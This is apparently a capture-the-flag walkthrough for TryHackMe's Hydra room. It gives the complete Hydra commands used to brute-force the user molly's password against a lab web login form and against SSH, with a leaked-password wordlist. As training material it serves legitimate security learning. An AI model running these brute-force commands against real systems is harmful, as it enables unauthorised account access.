# Hydra&#x20;

**Room Link:** [https://tryhackme.com/room/hydra](https://tryhackme.com/room/hydra)

## **Walkthrough**

**Use Hydra to brute force molly's web password. What is flag 1?**

Opened up the webconsole and tried entering the credentials to see what the request would look like. We can see the failed login attempt message and the fields used for login which we can used to craft our hydra command.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

```
hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Use Hydra to bruteforce molly's SSH password. What is flag 2?**

```
hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V
```
